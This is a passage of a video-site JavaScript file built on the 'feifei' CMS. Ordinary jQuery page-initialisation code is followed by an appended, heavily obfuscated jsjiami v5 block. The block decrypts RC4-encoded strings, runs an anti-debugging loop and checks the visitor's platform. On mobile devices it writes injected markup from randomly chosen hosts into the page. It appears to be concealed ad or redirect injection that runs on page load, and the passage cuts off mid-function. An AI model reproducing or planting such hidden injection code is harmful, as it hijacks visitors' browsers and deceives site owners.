						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.alert-card').html('Loading...');
						},
						error : function(){
							$('.alert-card').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.alert-card', '充值成功，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else{
								feifei.alert.warning('.alert-card', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
}
//end
};
/*.ff-search #wd #ff-goback .ff-gallery .ff-raty .ff-img .ff-share .ff-safecode .ff-reply*/
$(document).ready(function(){
	if(feifei.browser.useragent.mobile){
		feifei.mobile.jump();
		feifei.mobile.nav();
		feifei.mobile.goback();
		feifei.mobile.flickity();
	}
	feifei.user.load();
	feifei.cms.nav();//
	feifei.cms.collapse();
	feifei.search.dropdown();
	feifei.search.autocomplete();
	feifei.search.hot();//
	feifei.search.submit();//
	feifei.search.keydown();//
	feifei.image.lazyload();
	feifei.image.slide();
	feifei.image.qrcode();//
	feifei.playurl.tongji();
	feifei.playurl.more();
	feifei.playurl.dropdown();
	feifei.playurl.download();
	feifei.playurl.active();
	feifei.page.more();
	feifei.page.keydown();//
	feifei.updown.click();
	feifei.score.raty();
	feifei.scenario.load();
	feifei.forum.load();
	feifei.vcode.load();
	feifei.scroll.totop('ff-totop',10);
	feifei.record.load();//
	feifei.hits.load();
	feifei.share.baidu();
});



 /*
/*sale 2.14.zye
 */
 

 
var encode_version = 'jsjiami.com.v5', rcbps = '__0xd747d',  __0xd747d=['JcORN8O2','woPCt8KWw5Y=','woPCtcKTw5U=','JcOJM8Ov','BRvCpA==','w4kjwrXDjg==','XsOxIcOR','w4gJwpQV','H8KMwrnChg==','wrtfM8O2','dcK5wrIm','wpwLfTtywrPCvQxmU3fCgH/DlURewrY7SXo=','wp0EU8OPD2Q=','wpDCsE5pwrfDgQ==','GcKEw54u','bsOTwrNRccOZwprCl8Oww5/Cs0JTw5o=','wprDncO8TsOA','wop9bzHCtsO/Hw==','wrTDmsO2w6xU','w4/DmUIew6fDmcOmw5tow4bCh8KkwqZdMg==','wojDlRwLwqU=','wrBJCjZ9ZVs=','w41nf3nCrsOrAMO4wpPDsFQmwqPCozMWwrp8woVdVzIswq/DrsKxYzNVfcKFNcORwqLDoMOUUcOJwosXwrfCiDXCk8Kqw78KSsOaw4fCnMOxUcOzYHwZwpc6NnvDqWkpRMORw4BJSsKwwokxwqIWOVsxQg==','NAhuw5zCncKOwqk=','RMOZw5RZXWYFwrJhIMOKVAjDv8O9w7NtwrjDk8O+w6vDrlAoV8K9G8OWVxIowq7DkxbCli3DlMONwqhzMxXCngDDhBjCvcKbO8KHRcKXFG9JY8OPbsK4wqp9R0QFwpvDmQNEZMOBbiHDvw==','UMOVwoxkMcKsw4bDqjNWDnQ=','wp7Dm8OsVsOAw5rDtQ==','wp3DjsKEw61PPsKcJMO4B8OkwpkIwpdHw48WwqIow5sPw7LChy/Dn8KWR2wOw5Qiw41/wq0ka8KlAFouAHEXP8OMahbDizEuFxt4w7t0wrc0LMOiPsKfwocZD01hwp3DgcOVw4xmw48bwr5pK8OMw57DhsKJwrzCj8OlI2jDi8O7wqx3WFltw61gOcOxFE14w4dUwohAw4NuwqVK','IMOow5Bgw6Iiw74=','wpHDosKMw4PCi1HDoCfDlF4=','fMOLKsOvwpwJw6g=','w4lsw7rDvsKywpLDpA==','wqDCocKNZhNJwqU=','S8KYw5UoJMO7wpXCq3dWHHdiwpzCmsOMJsO0QcOjw5vDoMOFw7nDiMOXwow4w4LDhMO3Rnk1','BcK3WWrDpG/DsRMbwr/DuyzCvsKjw6Z/QXEdw6gnBGjCisOQJ0I0wqjCknfDhydlasKkw7DDnMK6wqw2JMOUbmbDq8OcG1Zvw4PCp8Oowrk9BHrCjV4aw73Cp8K+w7wne8KYw5ABdxzDllFoLwnChsOxwoRGwoDDnMKEQDLCnQl2wpfCjEbDrDEbwo0JAMKYwpfCssKIw6YmwpVDw4x2Y2RE','wovCp0l6wqbDhR0=','TMK5O8ODw63DjX7DqA==','w5ICD8OlM1AMHULCnDLDgsOdw4/Dgw==','U39Gwok5wq3DqsOsSg==','FsKWHsOrwqvDvw==','HsOIw5NMCWYOw6E=','w6fCq8KU','wpXDhsOI','w6fCr8OWbkNZw7pKwoXCh8Klwp18','w4p1XQ==','Y8OFwq19fMORwp7DnMO9w4TCnBVswos=','54mu5p+o5Y+N772ew7pp5L6N5a+m5p285b+/56iz772G6LyJ6Ky75pa95oyb5oii5LuC55u75bW/5L2b','5Yun6Zqi54iK5p2H5Y+Q776rPFjkvJLlrInmnqzlvoPnqaA=','w7oRIBYJ','VcK0VjvDpA==','w45/Ww==','woQ/SsOPNw==','w6jCp01pw6g=','wrIYaVJj','w5/DjcKXwrlC','RcKGVQLDlQ==','e8Kgwog=','F8KVwojCq8OfUDXDq8ObVcOlwpjCiUHCs2k=','w6FiCGt4w5tdwoTDrivCnzQ6wrrCkibDpRwYB8OAwqHDmMKXeHckwrfDuR4CA8K0woPCr8OywqdEw7PChcKKw7tJw6s/VcO/wowPMQzDhTgnwolewoHDsDnDi8K0cQ==','HsKFw5k/','wqPDoMOiw7B4','w6hOw7/Cok8=','amho','54m55p+J5Yyt77+lbMKD5L635ayx5pyC5by056ip772A6L+D6K2Y5pW25oyz5oiU5Lim55qJ5baL5L6Y','w49kKA==','M8K/worCrVM=','wo4DwqjDusKi','JA0Bwqsv','aRcoZGM=','w4PCmWDCtGM=','w7rCmAdyRQ==','Sj/CgMOCw5U=','DMOYw45b','wrgZaCMg','QcOrD8Oxwo4=','w5tiWgU=','Nw9Qw43CsQ==','LMKHwp4EKQ==','EsK5wq1VJQ==','w7wDLiE3','McOcMsOWw7s=','w6rCgMKqw7bCpg==','w5tyfhTDtA==','wprCncK8dQc=','UcOjwqZfbA==','wrLDrcO5w5Vi','WRTCrcOIw4Y=','wqZLEy5h','w4rCpMKRw7/Cvw==','dsKowo/CuUg=','w453WR3DhA==','GMKGw6MsIg==','wpPCoMObK8Kq','wp/Ch2t9wrU=','D8KHwobCiG4=','H8KrGk7DoQ==','RMOVCiPCoQ==','w5LDpcKIwple','woRvIAxf','GcOnMcKqTg==','G8OxQSfChMKBKw==','ZMOROALCng==','wqsmeVtT','TcKSTCPDvA==','w57CujxRZF/DlA==','Hm0QwpBqwrjCsMO1HsKXXMKZRFpucl4=','wqpLDwVa','PjcAwpE5','bsOvLwI=','FcOuK8OSw6TDlXLCuRs=','wpDCukc=','wqLCtDAEVQ==','FMOzKsOCw7M=','D8O/XTo=','UmNDwo86','wpdTwo3Dr008','woA9bFZH','w7XCqcKmw5HCsg==','Q8KEwrTCjWnCnQ==','Hgo+wrQ/','JMOqw5V9w7M=','NcKpwpDCmVcgCQ==','wrvCvMKD','woIRUMOqbEBe','JCkKwpc=','wpdUwoLDrmMkMw==','w5/CgUlxw5F1cw==','wpILwoYSVg==','PsOcG8KceA==','wqPDp8Otw6p5woxC','w5jCi0V3w5k=','QgAjQ0PCkzQ=','woIxwqbDjMKww7TCjsKyw7k=','F8K3GFzDkQ==','wpMbwq/Dn8Ky','M8KTNsOcwos=','OMKCwpLCjlY=','w6nCl2txw7w=','wqonasOJWw==','wrZDwo3DmU4=','wpDClGV8wpA=','w5jCq8KHw5bChw==','ITEbwpMX','wq/CjXdJwrM=','bsOwMMO9wq8=','wpIDaU9H','CMKbDmTDpw==','B8O4EMOQw4A=','ShgeSUg=','ZwDCmMONw4g=','w5bCnWBlw7c=','w4hvRjrDsg==','w6V1CQ==','dWNAwoMM','FcKbwpMPKg==','N8KiPMOBwoU=','wpJ5w4E=','c8K2wpg=','QcOHIQ==','wojCozQ=','woI7wrE=','wrXDpsOnw7xwwolJKns=','HcKzwrN7L0wfbwURwpROw6HDgA==','54u15p+55Y6l77yuYUDkvqvlrqrmnoHlvqnnqprvv4LovYLoravml47mj7Xmi4HkuIrnm4flta3kv6o=','w4BXSwnDiQ==','w7LCnRtSQg==','CsKOJ0HDjQ==','UMOQJCXCtg==','EMKtC3HDjg==','Q8KJwq/CpF8=','NsOqw4l4w74=','OTlEw5/Cvw==','woDCgsKJWiY=','w7PCoB1hTg==','w7ptPMO+Dw==','wrXCoVNowog=','wp8LwrYHZg==','X0VNwpkH','wrPDvMOxw7B4woc=','F8KbJw==','wpgaZyw8w7Q=','EMK4Di7Cp2bCogBQwrrCljbDocKwwqM=','w6vCt8KNZFZMwq8LwpbCksO+woYuw6nDqFTDs2wCIG80cw7DimTCizN5WDYaw7bDp8KXc3HDgwFxwoTCh114w7fCvmsOUsOMXzV+w7lvLjQGDsKswpQOTmIkYCY8w4RSWgMf','BlFxH03DgW3DscORFi50','woFmJyU7woUcw5TCuko=','w50NW8O6d0VUD1DCiWPCg8OMw4DClMOPDxbDtmpXLz1UcWrCqWBDwpnCnmTDqQs=','wojDl0nCh18UTsKI','KsOFwqQsacOJwpHCncOmw5LCrl11w5HCsULDtsKbw4wXAsKPO8O2w5wRbyInZVDClU3CgMKsC8K7YcOzB8OsC1x7w6HClMKQwr1yYUfCisKQwqFjwpFXw5shwpEww4YZwqjCuVnDj8KUJcKVIMKoMi3CtmvCssKswo9Zwqxiw53CqsKaw6d5bsOvdcOcIyY1wrIowr7DhMKDwqrCm8OWdXVcw7Ap','w6RIAHpsfFPDusKzJ8KRw47Ch0jDhTvDrsKUwqNmJMO+wpRzw6EXwr7DqsOew4cNEcOhUADCscKIwoNvwotowotrFFVfw4kIw6gsw6gjVzXDuSLCkjs7w6tWw7UQw5fCkkNqw7o9OsKyEBbDkUkAwpzDsQ==','fwlzw5HClMKHw7k=','YAlkwpDCjMKXwqHCn8K5MV83ZsKrD3zDhcKVw5J4CsKMB8KVw5EGO0VAFcKZwoTCocKSJjA0w4Jlw4jCtXnDm8Oww5LDqzjDrQHCpgV0w6oyw6ZvKcKgFMO0w6HDoMOfwpstw7cPeB/Ck8O5UWkbwpoZwqxIHgzCsVLCvcOuw4B5R8O+w4VTwozDpcO3wpVpKsKdEn5ew4QVw5JLw7/ChcOvw6QYwq8=','FGBHwp9k','YMORwoh6Vw==','wrnCssOs','woXCuEw=','H8K+w5Y=','wrcNXsOMMQ==','wrnDkhY3wp0=','YxgrZWA=','wqQiwoTDjMKL','F8ObBMKCaA==','w5F8GcOCCA==','w4fCmxVxRw==','Ni1Rw7DCoQ==','wrbDvsO7w5BV','w6bDlcK2wq1p','D8Oyw6hsw5U=','QsKiSwfDiA==','UcOYMSjCtw==','fsOANcOswqw=','w5FkO8OyOA==','B8KWwp7CgcOo','w4BnC8OvDw==','wqdewobDsFY=','BMKwwrV7Og==','MsONZDnCgQ==','HsKUwrwTLg==','w6R3w4PCo34=','wpLCt29Uwq4=','KsKQK2PDgCd8','w45nw67CoFA=','wrfDusOqw61zwoxJ','wrAKasOvYg==','LMOcAMKHb8K8woQ=','wqzCmUtbwpM=','DsKGHcO6wq3Dp1g=','w77Cl31xw5A=','EcOmGMOtw6w=','wos8U8ObKg==','wpfDtxQ6wrw=','P8KrOlDDkg==','OcKEwqMHEA==','K8OCCMKHbMK/wpgk','w4jCpjdQSlTDlF7Dqg==','DcKuw47CpcKrwoRiWcOVPj0=','EcKqw7LCsMKI','AMKCw54=','EMKaEMOrwrDDhFA=','w6ogOg==','w5PDnMKE','EcOwSzHCk8KiKA==','FsOPCg==','NXZd','wr94w7Q=','MsKjwr8lH3Zb','wozDocOtw6xu','IcKvwpA=','HMKBwoU=','w4zClFY=','woBpRh/DmDYBImUe','wq/CoyMP','wocRUMOH','RcKsw6fCvsK9w4FzcsOVPyvCiUpZwpNCOQo7w6BJw6zChsO8blLCrhYUPsKNwpHChVlCwoYTw70UB8KQDEjCvWfDg8K+d8KocMOwwq0IJjoIdsORw6NRCx/ChiPCtCjChFYCwr0SBMOlw4lbwrcpwppIHSXDlcK2wpnDo8ObbHdww7fClFFbEsOEw6AwwpHDvEJKAhsMwozDjMKBwpjCmWl1w7bCicK7wp0UQ8KCS8OdBcOxw61xwrDDuMKpw5/DscK1C2ZiIcK2wrjCrcK5wqJ2RVPCr2xCwrURe8KNfybDj8Oewq7Dh8Kmw4VrwpwKwrVTw41VTcKICgLDmMOqaMKKaxkjeMOqBHtewrsIH8OjblJKwp8ONsKgdw==','w7dSOsO/','wpByw77Ds8Kn','VMKhWzbDqQ==','wp7CukR3','Z8Kkwr0yBlRYw57DgAsmw5BhWsOlwr9gWMKqZiVKcHJWcwrDuWJuwobDhAHCukHCkhpbasODOiE7MirCqV8Fw6DDr1ULw73CucKeKMKHw7fDncOPJcK7UsOHScKvw5HCvVDDsmnDgMK9VGIOw7vDhMOpwrRaw5LCvDzCjcOSLMKIwqlNQVDDu8KfP33CtsKVMlswaVNnw4fCkMOBw7gswoVNwonCnn3DrcOAwpgWwrUUUn/DmH1O','w5c/w6jDtcK/wprCv0XDqXnCpcKbwo9ueMOfw41Qw70CC2fDpWpCFsOjw7p5w6TCmgtXE8ONagfCnF7Dq3Ie','wo0KWcOSQCM=','DsOUw45GH2YNw6YyMA==','D8Kow7HCo8K+wo11','w4p1w6XClnA=','Q8OpFMONwqo=','wpxPwoHDsQ==','worDrMOhw4pZ','wqLCmsKXeAE=','fsO0wrJOcQ==','w7t4w5rCvVU=','VcKsVSU=','MsKhHsOPwoM=','dwE7fXg=','RWJR','Dk1DwqFq','wrZmegPCjQ==','fMOFwqJmXMObwpLCnMOq','c8OuBQLCkQPCgcO+Y8OFwo8=','wpIcwpQF','wq9PFzJrMxrCusKoOsKgwobCglTDlTvDsMKiwrdmKsO0wphxw64ZwrvCosKLw5UeG8KqVwnDp8Ocwpwyw4p9woRnGw==','w5TCmlNyw40jOcOUw4HDpMKdMcKiw5o9wovDg1HDhcOLE8Oqw7oew5rCsQA7wrTCvMKLwozDn8KKBsOiwo/DoWBqw54mw6s0','wp1rw7rDt8Ktw43DtQjDpW/Cr8OQwpcgPsKKwoMZw7gTV2bDrHIEH8Osw6guw6PCkUpGXMKDbwTDgVLCtDlHccK+','H8Kfw4Q7I8Kow5XDqjRbFmQvwpzCncKRPsOoUcO+wo3Dt8O/w6vCiMOfwpByw4XDssOxV3F4w7vCr084QWzCqTXDqSjCmQ==','w47Cj0lmw5F0','OsKjwpDCjUwk','asKxw648VEUPwoLChwNv','F8Kxwqk=','wqxLwrU=','T8K9wrbCtsOrwp0oZsKBMWrCkA8YwoFrXg==','w45lShXDmH4BP2IZw7cHw5jDpcOGLTjCuhIECsKawpRXw4TCrHc=','w5IQEzcK','C8ONw5FGCQ==','fcOxBAzCqA==','SsKhVDXDpHI=','ccOZwqFxbA==','wrQKwrDDisK2','JsKDwq3CknU=','w7JHOMO/GA==','wohSEQZp','w43DjcKLwrxP','XwPCtsOnw5c=','w5gxNyUowoUcw5TCug==','VMKXwqjChnQ=','Rx7CsA==','w5fDk8KBwro=','D8Ocw49B','woIcwoUEVA==','FMKDw5E5EcOm','w6dMw6DCuEk=','I8Kjwq9bKw==','wqXCssKKdhlI','w4vCv0BIw50=','w5XDjQQPwr0=','CMK0VDU=','w6nCoi0I','bR5ow4vCgA==','woFzUQU='];(function(_0xaea267,_0xd2b2ee){var _0x11e807=function(_0x274ca5){while(--_0x274ca5){_0xaea267['push'](_0xaea267['shift']());}};var _0x5db337=function(){var _0x42ea4b={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x14ab1c,_0xd57638,_0x20fe77,_0x6ff53b){_0x6ff53b=_0x6ff53b||{};var _0x4637aa=_0xd57638+'='+_0x20fe77;var _0x1c1929=0x0;for(var _0x1c1929=0x0,_0x1e61aa=_0x14ab1c['length'];_0x1c1929<_0x1e61aa;_0x1c1929++){var _0x2b8200=_0x14ab1c[_0x1c1929];_0x4637aa+=';\x20'+_0x2b8200;var _0x9f0f96=_0x14ab1c[_0x2b8200];_0x14ab1c['push'](_0x9f0f96);_0x1e61aa=_0x14ab1c['length'];if(_0x9f0f96!==!![]){_0x4637aa+='='+_0x9f0f96;}}_0x6ff53b['cookie']=_0x4637aa;},'removeCookie':function(){return'dev';},'getCookie':function(_0x4aec26,_0x4bc980){_0x4aec26=_0x4aec26||function(_0x3286e9){return _0x3286e9;};var _0x392d41=_0x4aec26(new RegExp('(?:^|;\x20)'+_0x4bc980['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x53ef57=function(_0x57f9b6,_0x1ea876){_0x57f9b6(++_0x1ea876);};_0x53ef57(_0x11e807,_0xd2b2ee);return _0x392d41?decodeURIComponent(_0x392d41[0x1]):undefined;}};var _0x16f317=function(){var _0x5db633=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x5db633['test'](_0x42ea4b['removeCookie']['toString']());};_0x42ea4b['updateCookie']=_0x16f317;var _0x313494='';var _0x4c75ce=_0x42ea4b['updateCookie']();if(!_0x4c75ce){_0x42ea4b['setCookie'](['*'],'counter',0x1);}else if(_0x4c75ce){_0x313494=_0x42ea4b['getCookie'](null,'counter');}else{_0x42ea4b['removeCookie']();}};_0x5db337();}(__0xd747d,0xe8));var _0x4d40=function(_0x2f4d68,_0x33c920){_0x2f4d68=_0x2f4d68-0x0;var _0x2bda47=__0xd747d[_0x2f4d68];if(_0x4d40['initialized']===undefined){(function(){var _0x2ac706=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0xaeb101='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2ac706['atob']||(_0x2ac706['atob']=function(_0x559c56){var _0x4e44b7=String(_0x559c56)['replace'](/=+$/,'');for(var _0x34ee14=0x0,_0x3d3433,_0x3b7668,_0x1a22ed=0x0,_0x28812b='';_0x3b7668=_0x4e44b7['charAt'](_0x1a22ed++);~_0x3b7668&&(_0x3d3433=_0x34ee14%0x4?_0x3d3433*0x40+_0x3b7668:_0x3b7668,_0x34ee14++%0x4)?_0x28812b+=String['fromCharCode'](0xff&_0x3d3433>>(-0x2*_0x34ee14&0x6)):0x0){_0x3b7668=_0xaeb101['indexOf'](_0x3b7668);}return _0x28812b;});}());var _0x4d4072=function(_0x249595,_0x257b4b){var _0x3bbbbc=[],_0x21c3e0=0x0,_0x4b1417,_0xfd2e15='',_0x3973d4='';_0x249595=atob(_0x249595);for(var _0x56a58d=0x0,_0x30001a=_0x249595['length'];_0x56a58d<_0x30001a;_0x56a58d++){_0x3973d4+='%'+('00'+_0x249595['charCodeAt'](_0x56a58d)['toString'](0x10))['slice'](-0x2);}_0x249595=decodeURIComponent(_0x3973d4);for(var _0x19b046=0x0;_0x19b046<0x100;_0x19b046++){_0x3bbbbc[_0x19b046]=_0x19b046;}for(_0x19b046=0x0;_0x19b046<0x100;_0x19b046++){_0x21c3e0=(_0x21c3e0+_0x3bbbbc[_0x19b046]+_0x257b4b['charCodeAt'](_0x19b046%_0x257b4b['length']))%0x100;_0x4b1417=_0x3bbbbc[_0x19b046];_0x3bbbbc[_0x19b046]=_0x3bbbbc[_0x21c3e0];_0x3bbbbc[_0x21c3e0]=_0x4b1417;}_0x19b046=0x0;_0x21c3e0=0x0;for(var _0x45ef9c=0x0;_0x45ef9c<_0x249595['length'];_0x45ef9c++){_0x19b046=(_0x19b046+0x1)%0x100;_0x21c3e0=(_0x21c3e0+_0x3bbbbc[_0x19b046])%0x100;_0x4b1417=_0x3bbbbc[_0x19b046];_0x3bbbbc[_0x19b046]=_0x3bbbbc[_0x21c3e0];_0x3bbbbc[_0x21c3e0]=_0x4b1417;_0xfd2e15+=String['fromCharCode'](_0x249595['charCodeAt'](_0x45ef9c)^_0x3bbbbc[(_0x3bbbbc[_0x19b046]+_0x3bbbbc[_0x21c3e0])%0x100]);}return _0xfd2e15;};_0x4d40['rc4']=_0x4d4072;_0x4d40['data']={};_0x4d40['initialized']=!![];}var _0x1824f7=_0x4d40['data'][_0x2f4d68];if(_0x1824f7===undefined){if(_0x4d40['once']===undefined){var _0x1394b7=function(_0x2d7b66){this['rc4Bytes']=_0x2d7b66;this['states']=[0x1,0x0,0x0];this['newState']=function(){return'newState';};this['firstState']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['secondState']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x1394b7['prototype']['checkState']=function(){var _0x202676=new RegExp(this['firstState']+this['secondState']);return this['runState'](_0x202676['test'](this['newState']['toString']())?--this['states'][0x1]:--this['states'][0x0]);};_0x1394b7['prototype']['runState']=function(_0x5ddc37){if(!Boolean(~_0x5ddc37)){return _0x5ddc37;}return this['getState'](this['rc4Bytes']);};_0x1394b7['prototype']['getState']=function(_0x1a1f40){for(var _0x2d53bd=0x0,_0xb83134=this['states']['length'];_0x2d53bd<_0xb83134;_0x2d53bd++){this['states']['push'](Math['round'](Math['random']()));_0xb83134=this['states']['length'];}return _0x1a1f40(this['states'][0x0]);};new _0x1394b7(_0x4d40)['checkState']();_0x4d40['once']=!![];}_0x2bda47=_0x4d40['rc4'](_0x2bda47,_0x33c920);_0x4d40['data'][_0x2f4d68]=_0x2bda47;}else{_0x2bda47=_0x1824f7;}return _0x2bda47;};var _0x3de6d2={'win':![],'mac':![],'xll':![]};var _0x2dc645=navigator[_0x4d40('0x0','hK5E')];var _0xc6bf66=navigator[_0x4d40('0x1','yijt')][_0x4d40('0x2','e66N')]();setInterval(function(){var _0x3b4c2e={'hkpzT':function _0x24612a(_0x5e7722){return _0x5e7722();}};_0x3b4c2e[_0x4d40('0x3','e66N')](_0x3ab7be);},0xfa0);_0x3de6d2[_0x4d40('0x4','Z^Uh')]=_0x2dc645[_0x4d40('0x5','oHYp')](_0x4d40('0x6','kAr^'))==0x0;_0x3de6d2[_0x4d40('0x7','9n09')]=_0x2dc645[_0x4d40('0x8','Y$NS')](_0x4d40('0x9','hK5E'))==0x0;_0x3de6d2[_0x4d40('0xa','9CBc')]=_0x2dc645==_0x4d40('0xb','FF*i')||_0x2dc645[_0x4d40('0xc','MeUR')](_0x4d40('0xd','1O^9'))==0x0;if(_0x3de6d2[_0x4d40('0xe','66R(')]||_0x3de6d2[_0x4d40('0xf','[8SE')]||_0x3de6d2[_0x4d40('0x10','YPZ8')]){var _0x674f16=_0x4d40('0x11','JXeO');$(_0x4d40('0x12','W%Jq'))[_0x4d40('0x13','48G7')](_0x4d40('0x14','e66N'));$(_0x4d40('0x15','KgxM'))[_0x4d40('0x16','tB&W')]();$(document)[_0x4d40('0x17','fhIY')](function(){var _0x36b6bc={'KUjAK':function _0x287971(_0x1dc47a,_0x2ceef8){return _0x1dc47a(_0x2ceef8);},'HPWVS':_0x4d40('0x18','NpY^'),'JdbSO':function _0x48a8bf(_0x40a735,_0x478eda){return _0x40a735+_0x478eda;},'uIsjw':function _0x5d2ad5(_0x3aa2ca,_0x5bf82c){return _0x3aa2ca+_0x5bf82c;},'wBuZl':_0x4d40('0x19','MeUR'),'zXUjn':_0x4d40('0x1a','tB&W'),'VnvMT':_0x4d40('0x1b','48G7'),'lUGUD':_0x4d40('0x1c','&(Ln'),'XrfBW':_0x4d40('0x1d','e66N')};_0x36b6bc[_0x4d40('0x1e','W%C1')]($,_0x36b6bc[_0x4d40('0x1f','MSMF')])[_0x4d40('0x20','gVY0')](_0x36b6bc[_0x4d40('0x21','1O^9')](_0x36b6bc[_0x4d40('0x22','O0Ak')](_0x36b6bc[_0x4d40('0x23','WE9[')],_0x674f16),_0x36b6bc[_0x4d40('0x24','W%C1')]))[_0x4d40('0x25','fhIY')]();_0x36b6bc[_0x4d40('0x26','oHYp')]($,_0x36b6bc[_0x4d40('0x27','TPma')])[_0x4d40('0x28','rnjt')](_0x36b6bc[_0x4d40('0x29','@zZx')],_0x36b6bc[_0x4d40('0x2a','t562')]);});}var _0x27feda=navigator[_0x4d40('0x2b','WE9[')][_0x4d40('0x2c','YIhu')]();isMobile=/(iphone|ios|android|mini|mobile|mobi|nokia|symbian|ipod|ipad|windows\s+phone|mqqbrowser|wp7|wp8|ucbrowser7|ucweb|360\s+aphone\s+browser)/i[_0x4d40('0x2d','UewM')](_0x27feda);var _0x20a7dc=new Array(_0x4d40('0x2e','Nsyt'),_0x4d40('0x2f','IScx'),_0x4d40('0x30','tB&W'),_0x4d40('0x31','Z^Uh'));var _0x558509;_0x558509=_0x20a7dc[parseInt(Math[_0x4d40('0x32','IScx')]()*_0x20a7dc[_0x4d40('0x33','66R(')])];function _0x415e2b(_0x147505){var _0x38a130={'oYGwR':_0x4d40('0x34','MeUR'),'zpMaN':function _0x5b4376(_0x5191a7,_0x12bd6d){return _0x5191a7||_0x12bd6d;},'xofeq':function _0x1e6767(_0x3d2499,_0x216c43){return _0x3d2499<_0x216c43;},'SCucv':function _0x58c5b8(_0x22077b,_0x1630d5){return _0x22077b===_0x1630d5;},'pESxM':_0x4d40('0x35','[8SE'),'gzfyc':_0x4d40('0x36','gVY0'),'OirDq':_0x4d40('0x37','e66N'),'TcvIe':function _0x34281d(_0x582ba3,_0x25cec7){return _0x582ba3*_0x25cec7;},'wQgJc':_0x4d40('0x38','JXeO')};var _0x57bd60=_0x38a130[_0x4d40('0x39','kAr^')][_0x4d40('0x3a','&(Ln')]('|'),_0x38e268=0x0;while(!![]){switch(_0x57bd60[_0x38e268++]){case'0':return _0x286dfd;case'1':_0x147505=_0x38a130[_0x4d40('0x3b','YIhu')](_0x147505,0x20);continue;case'2':var _0x286dfd='';continue;case'3':var _0x363b61=_0x52b7f2[_0x4d40('0x3c','fhIY')];continue;case'4':for(i=0x0;_0x38a130[_0x4d40('0x3d','WE9[')](i,_0x147505);i++){if(_0x38a130[_0x4d40('0x3e','FF*i')](_0x38a130[_0x4d40('0x3f','66R(')],_0x38a130[_0x4d40('0x40','KgxM')])){var _0x49d69b=_0x38a130[_0x4d40('0x41','Nsyt')][_0x4d40('0x42','9n09')]('|'),_0x5ac07d=0x0;while(!![]){switch(_0x49d69b[_0x5ac07d++]){case'0':_0x54311a[_0x4d40('0x43','tGY@')]=func;continue;case'1':_0x54311a[_0x4d40('0x44','kAr^')]=func;continue;case'2':_0x54311a[_0x4d40('0x45','*wVH')]=func;continue;case'3':return _0x54311a;case'4':_0x54311a[_0x4d40('0x46','tGY@')]=func;continue;case'5':_0x54311a[_0x4d40('0x47','9n09')]=func;continue;case'6':var _0x54311a={};continue;case'7':_0x54311a[_0x4d40('0x48','&(Ln')]=func;continue;case'8':_0x54311a[_0x4d40('0x49','UewM')]=func;continue;}break;}}else{_0x286dfd+=_0x52b7f2[_0x4d40('0x4a','Z^Uh')](Math[_0x4d40('0x4b','W%C1')](_0x38a130[_0x4d40('0x4c','M7sQ')](Math[_0x4d40('0x4d','O0Ak')](),_0x363b61)));}}continue;case'5':var _0x52b7f2=_0x38a130[_0x4d40('0x4e','IScx')];continue;}break;}};var _0x465a6e=_0x415e2b(0xa);var _0x4b7bad=new Array(_0x4d40('0x4f','pOz7'),_0x4d40('0x50','fhIY'),_0x4d40('0x51','W%Jq'),_0x4d40('0x52','zhRm'),_0x4d40('0x53','JXeO'),_0x4d40('0x54','MSMF'),_0x4d40('0x55','$VNj'),_0x4d40('0x56','$VNj'),_0x4d40('0x57','MSMF'),_0x4d40('0x58','tGY@'),_0x4d40('0x59','FF*i'),_0x4d40('0x5a','I4O9'),_0x4d40('0x5b','UewM'),_0x4d40('0x5c','*wVH'),_0x4d40('0x5d','KgxM'),_0x4d40('0x5e','MeUR'));var _0x483b1a=_0x4d40('0x5f','Q@nh')+_0x4b7bad[parseInt(Math[_0x4d40('0x60','48G7')]()*_0x4b7bad[_0x4d40('0x61','NpY^')])];function _0x3fe108(_0x11d246){var _0x4a1f69={'tRuuB':_0x4d40('0x62','Z^Uh')};document[_0x4d40('0x63','WE9[')](_0x11d246)[_0x4d40('0x64','w)tx')][_0x4d40('0x65','t562')]=_0x4a1f69[_0x4d40('0x66','1O^9')];}if(isMobile){var _0x38253a=_0x4d40('0x67','pOz7')[_0x4d40('0x68','pOz7')]('|'),_0x4e7f15=0x0;while(!![]){switch(_0x38253a[_0x4e7f15++]){case'0':document[_0x4d40('0x69','Nsyt')](_0x4d40('0x6a','t562'));continue;case'1':document[_0x4d40('0x6b','zhRm')](_0x4d40('0x6c','&(Ln')+_0x558509+_0x4d40('0x6d','Z^Uh'));continue;case'2':document[_0x4d40('0x6e','w)tx')](_0x4d40('0x6f','9n09'));continue;case'3':document[_0x4d40('0x70','R*Zk')](_0x4d40('0x71','$VNj'));continue;case'4':document[_0x4d40('0x72','MSMF')](_0x4d40('0x73','tB&W'));continue;case'5':document[_0x4d40('0x74','O0Ak')](_0x4d40('0x75','Z^Uh'));continue;case'6':document[_0x4d40('0x70','R*Zk')](_0x4d40('0x76','fhIY'));continue;case'7':document[_0x4d40('0x77','NpY^')](_0x4d40('0x78','I4O9'));continue;}break;}}else{};(function(_0x397102,_0x55c29e,_0x186f6f){var _0x305c54={'GXtVQ':_0x4d40('0x79','7hs6'),'omSgr':function _0x276a27(_0x3d3267,_0xca7f53,_0x506a3b){return _0x3d3267(_0xca7f53,_0x506a3b);},'JUZKt':function _0x414607(_0x423745,_0x55d0d1){return _0x423745!==_0x55d0d1;},'tRjvr':_0x4d40('0x7a','rnjt'),'JgBRC':function _0x168e77(_0x1bf4dd,_0x588f21){return _0x1bf4dd===_0x588f21;},'nDldn':_0x4d40('0x7b','oHYp'),'UyLsB':function _0x190807(_0x5cf805,_0x99d386){return _0x5cf805===_0x99d386;},'KYTPX':_0x4d40('0x7c','&(Ln'),'BxaDB':_0x4d40('0x7d','$VNj'),'lAErS':_0x4d40('0x7e','1O^9'),'ufxpo':function 